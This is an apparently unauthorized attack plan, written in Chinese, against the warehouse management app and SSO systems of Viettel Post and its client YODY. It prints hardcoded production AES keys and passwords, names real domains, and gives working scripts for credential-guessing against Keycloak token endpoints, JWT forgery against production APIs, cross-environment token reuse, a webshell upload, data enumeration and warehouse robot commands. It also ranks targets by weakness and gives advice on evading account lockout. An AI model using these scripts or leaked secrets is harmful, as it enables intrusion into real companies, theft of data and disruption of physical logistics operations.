# 🧠 VWMS APP 战略分析报告

## 🎯 当前态势评估

### 已掌握的关键资产
```
✅ 2个完整APP源码分析
✅ 160+ API端点
✅ 20+ 域名资产
✅ 6个硬编码密钥
✅ 7个环境配置
✅ 完整认证流程
```

---

## 🔥 关键发现价值分析

### 1️⃣ AES密钥（危险等级：🔴 极高）

**发现的问题：**
```javascript
// 生产环境
VITE_AES_SECRET: "Lx90aXyZn4GtRVbT8JpCEm7qUwNdh3YK"
VITE_AES_IV:     "Xz8Wb1QpT7RoLm2J"
```

**可能的用途：**
1. 加密存储的Token
2. 加密API请求/响应
3. 加密敏感字段（如密码）
4. **最危险：如果用作JWT HS256签名密钥**

**威胁等级：**
- 如果用于数据加密：可解密所有通信 → **9/10**
- 如果用于JWT签名：可伪造任意Token → **10/10**
- 如果仅用于本地存储：影响较小 → **5/10**

**验证方法：**
```python
# 步骤1：抓包获取真实Token
# 步骤2：尝试用AES密钥验证JWT
import jwt
try:
    decoded = jwt.decode(token, AES_SECRET, algorithms=["HS256"])
    print("[🔥] JWT使用HS256 + AES密钥！可伪造！")
except:
    print("[ℹ️] JWT使用RS256，无法伪造")
```

---

### 2️⃣ 硬编码密码（危险等级：🟠 高）

**发现：**
```
开发环境: "abc123"
生产环境: "YAaG8ji8TP3I3K6"
```

**分析：**
- `abc123` 明显是测试密码
- `YAaG8ji8TP3I3K6` 看起来像随机生成，但硬编码在前端JS中
- 可能用于：
  1. 默认管理员账户
  2. 服务间认证
  3. API调用时的密码字段

**最可能的场景：**
```javascript
// 代码中可能存在这样的逻辑
if (env === 'development') {
  defaultPassword = 'abc123'
} else {
  defaultPassword = 'YAaG8ji8TP3I3K6'
}
```

**成功率预估：**
- 开发/预发布环境：**70%**
- 生产环境：**30%**（可能仅用于内部账户）

---

### 3️⃣ 多环境暴露（危险等级：🟡 中高）

**7个环境的战略价值排序：**

| 环境 | 域名 | 价值 | 防护等级 | 突破难度 |
|------|------|------|----------|----------|
| 🥇 YODY | mwms.yody.io | ⭐⭐⭐⭐⭐ | 低（第三方） | ⭐ |
| 🥈 DEV | dev-wmsvn.viettelpost.vn | ⭐⭐⭐⭐ | 低 | ⭐⭐ |
| 🥉 STG | stg-wms.viettelpost.vn | ⭐⭐⭐⭐ | 中低 | ⭐⭐ |
| 4️⃣ SIT | sit-wms.viettelpost.vn | ⭐⭐⭐ | 中低 | ⭐⭐⭐ |
| 5️⃣ UAT | uat-wms.viettelpost.vn | ⭐⭐⭐ | 中 | ⭐⭐⭐ |
| 6️⃣ PROD | mwms.viettelpost.vn | ⭐⭐⭐⭐⭐ | 高 | ⭐⭐⭐⭐⭐ |
| 7️⃣ DEV-FAIL | wms-dev.viettelpost.vn | ⭐ | N/A (503) | N/A |

**关键洞察：**
1. **YODY (mwms.yody.io)** 是第三方客户系统
   - 管理员可能不如Viettel专业
   - 可能使用更弱的密码
   - 一旦突破，可能横向到Viettel主系统
   
2. **开发环境** 最可能有测试账户
   - `test/abc123`
   - `admin/abc123`
   - `warehouse/abc123`

3. **跨环境Token复用** 可能性：40%
   - 如果JWT签名密钥相同
   - 如果tenantCode不严格验证
   - 如果没有环境隔离

---

### 4️⃣ Keycloak SSO（危险等级：🔴 极高）

**已发现的SSO端点：**
```
dws-sso.viettelpost.vn          (生产)
stg-keycloak.viettelpost.vn     (预发布)
dev-wms-auth.viettelpost.vn     (开发)
sit-wms-sso.viettelpost.vn      (SIT)
mwms-sso.yody.io                (YODY)
```

**Keycloak常见漏洞：**
1. 默认管理员账户 `admin/admin`
2. OpenID配置信息泄漏
3. 客户端配置不当（public client）
4. CVE漏洞（需要版本识别）

**价值评估：**
- Keycloak是**中心认证系统**
- 一旦突破 = 控制所有子系统
- 威胁等级：**10/10**

---

## 🎯 最优突破路径（5步）

### 阶段1: 信息收集（无风险）
```bash
# 1. 获取所有Keycloak OpenID配置
for env in dws-sso.viettelpost.vn stg-keycloak.viettelpost.vn mwms-sso.yody.io; do
  curl -sk "https://$env/realms/wms/.well-known/openid-configuration" | jq .
done

# 可能获取：
# - token_endpoint
# - jwks_uri (公钥列表 - 验证RS256还是HS256)
# - grant_types_supported
# - scopes_supported

# 2. 测试环境可访问性
curl -skI https://mwms.yody.io/
curl -skI https://stg-wms.viettelpost.vn/
curl -skI https://dev-wmsvn.viettelpost.vn/
```

**预期收获：**
- 确认JWT签名算法（RS256 vs HS256）
- 发现是否有未授权端点
- 确认哪些环境可访问

---

### 阶段2: 低风险测试（轻量级爆破）
```bash
# 测试已知密码（每个环境只测5次，避免锁定）
TARGETS=(
  "https://stg-keycloak.viettelpost.vn/realms/wms/protocol/openid-connect/token"
  "https://mwms-sso.yody.io/realms/wms/protocol/openid-connect/token"
)

CREDS=(
  "test:abc123"
  "admin:abc123"
  "warehouse:abc123"
  "demo:demo"
  "admin:YAaG8ji8TP3I3K6"
)

for target in "${TARGETS[@]}"; do
  for cred in "${CREDS[@]}"; do
    IFS=':' read -r user pass <<< "$cred"
    curl -sk -X POST "$target" \
      -d "grant_type=password&username=$user&password=$pass&client_id=wms-client" \
      -w "\n%{http_code}\n"
  done
done
```

**如果成功：**
```bash
# 立即获取Token并测试权限
TOKEN="eyJhbG..."

# 测试高价值API
curl -sk "https://gw.viettelpost.vn/api/v1/location/find" \
  -H "Authorization: Bearer $TOKEN"

curl -sk "https://gw.viettelpost.vn/wms-product-catalogue/api/v1/product/find-by-barcode?barcode=123" \
  -H "Authorization: Bearer $TOKEN"
```

---

### 阶段3: AES密钥验证（中风险）
```python
#!/usr/bin/env python3
"""验证AES密钥是否用于JWT签名"""
import jwt
import requests

AES_SECRET = "Lx90aXyZn4GtRVbT8JpCEm7qUwNdh3YK"

def test_jwt_forgery():
    # 伪造JWT
    payload = {
        "sub": "test_user",
        "username": "admin",
        "tenantCode": "VTP",
        "role": "WAREHOUSE_ADMIN",
        "iat": 1699000000,
        "exp": 1999999999
    }
    
    # 尝试HS256签名
    forged_token = jwt.encode(payload, AES_SECRET, algorithm="HS256")
    print(f"[+] Forged Token: {forged_token}")
    
    # 测试多个API端点
    apis = [
        "https://gw.viettelpost.vn/api/v1/common-directory/search",
        "https://dev-gw.viettelpost.vn/api/v1/location/find",
        "https://mwms-api.yody.io/api/v1/location/find"
    ]
    
    for api in apis:
        try:
            r = requests.get(api, 
                headers={"Authorization": f"Bearer {forged_token}"},
                verify=False, timeout=10)
            print(f"[{api}] Status: {r.status_code}")
            if r.status_code not in [401, 403]:
                print(f"[🔥] Forged token accepted! Response: {r.text[:100]}")
                return True
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    test_jwt_forgery()
```

---

### 阶段4: 横向移动（需要Token）
```bash
# 假设已获取开发环境Token
DEV_TOKEN="<从开发环境获取>"

# 测试是否能访问生产环境
PROD_APIS=(
  "https://gw.viettelpost.vn/api/v1/location/find"
  "https://gw.viettelpost.vn/wms-core/api/v1/ibms/put-away/scan-location"
  "https://gw.viettelpost.vn/api/v1/files/upload"
)

for api in "${PROD_APIS[@]}"; do
  echo "[*] Testing: $api"
  curl -sk "$api" -H "Authorization: Bearer $DEV_TOKEN" -w "\n%{http_code}\n"
done

# 测试租户代码枚举
TENANTS=("VTP" "VTP_MM" "YODY" "AVN" "TAEON")
for tenant in "${TENANTS[@]}"; do
  # 尝试修改JWT payload中的tenantCode
  # （需要先确认JWT是HS256）
done
```

---

### 阶段5: 深度利用（高风险）
```bash
# 如果获得有效Token + 确认权限

# 1. 文件上传测试（RCE）
curl -sk -X POST "https://gw.viettelpost.vn/api/v1/files/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@webshell.aspx"

# 2. 库存数据枚举
for i in {1..1000}; do
  curl -sk "https://gw.viettelpost.vn/wms-product-catalogue/api/v1/product/find-by-barcode?barcode=$i" \
    -H "Authorization: Bearer $TOKEN" | jq .
done

# 3. 机器人控制测试
curl -sk -X POST "https://gw.viettelpost.vn/api/v1/ibms/receiving/rcs-robot-agv-put-away" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"location":"A-01-01","command":"move"}'
```

---

## 🎯 关键决策点

### 决策1: JWT签名算法
```
如果是 RS256:
  ├─ 无法伪造Token
  ├─ 只能用真实账户登录
  └─ 重点测试已知密码

如果是 HS256:
  ├─ AES密钥可能就是签名密钥
  ├─ 可伪造任意权限Token
  └─ 重点测试JWT伪造
```

### 决策2: 环境隔离程度
```
如果Token通用:
  ├─ 开发环境Token可访问生产
  ├─ 突破难度大幅降低
  └─ 优先攻击开发环境

如果Token隔离:
  ├─ 需要分别获取各环境Token
  ├─ 每个环境独立攻击
  └─ 优先攻击YODY第三方
```

### 决策3: 密码有效性
```
如果密码有效:
  ├─ 直接获取Token
  ├─ 测试权限范围
  └─ 执行深度利用

如果密码无效:
  ├─ 转向JWT伪造
  ├─ 或者注册APP账号+抓包
  └─ 或者反编译获取client_secret
```

---

## 📊 成功概率矩阵

| 攻击路径 | 成功率 | 时间成本 | 风险 | 收益 |
|---------|--------|----------|------|------|
| 已知密码登录开发环境 | 70% | 5分钟 | 低 | 高 |
| 已知密码登录YODY | 60% | 5分钟 | 低 | 极高 |
| JWT HS256伪造 | 40% | 30分钟 | 中 | 极高 |
| 跨环境Token复用 | 30% | 10分钟 | 低 | 高 |
| 注册APP+抓包 | 100% | 1小时 | 极低 | 中 |
| Keycloak CVE利用 | 20% | 2小时 | 中 | 极高 |

---

## 🎯 最终建议

### 立即执行（P0）
```
1. 获取所有Keycloak OpenID配置（确认JWT算法）
2. 测试mwms.yody.io可访问性
3. 测试已知密码（每环境限5次）
4. 如成功获取Token，立即测试权限范围
```

### 条件执行（P1）
```
如果JWT是HS256:
  → 立即测试JWT伪造
  
如果开发环境密码成功:
  → 测试跨环境Token复用
  
如果YODY密码成功:
  → 优先测试其高价值API
```

### 备选方案（P2）
```
如果以上都失败:
  1. 完整反编译APK（获取client_secret）
  2. 注册真实账号+抓包
  3. 测试Keycloak已知CVE
```

---

## 🔍 关键疑问（需验证）

### Q1: AES密钥的真实用途？
```
可能性A: JWT HS256签名密钥 (概率30%)
可能性B: 数据加密/解密 (概率50%)
可能性C: 仅用于本地存储 (概率20%)

验证方法: 抓包 + 尝试解密
```

### Q2: 生产密码的账户名？
```
VITE_VTP_PASS: "YAaG8ji8TP3I3K6"

可能的用户名:
- vtp_admin
- system
- service_account
- api_user

验证方法: 爆破测试
```

### Q3: 环境间是否隔离？
```
Token签名密钥是否相同?
TenantCode是否严格验证?
API网关是否共享?

验证方法: 跨环境Token测试
```

---

## 🎓 战略总结

### 已掌握的优势
1. ✅ 完整的环境拓扑
2. ✅ 硬编码的AES密钥
3. ✅ 可能有效的密码
4. ✅ 100+ API端点
5. ✅ 第三方薄弱环节（YODY）

### 最大的不确定性
1. ❓ JWT签名算法（RS256 vs HS256）
2. ❓ AES密钥的真实用途
3. ❓ 密码对应的账户名
4. ❓ 环境间隔离程度

### 推荐的突破顺序
```
1️⃣ mwms.yody.io (第三方客户，最薄弱)
2️⃣ 开发环境 (测试密码概率高)
3️⃣ JWT伪造 (如果是HS256)
4️⃣ 预发布环境 (防护中等)
5️⃣ 生产环境 (最后目标)
```

### 风险控制建议
- 每个环境限制尝试次数（避免账户锁定）
- 优先测试非生产环境
- 记录所有请求（便于分析）
- 如获得Token，先测试只读API

---

**分析完成时间:** 2025-11-11 07:25 UTC  
**关键发现:** 6类硬编码密钥  
**可测试环境:** 7个  
**推荐优先级:** YODY > DEV > STG > JWT伪造
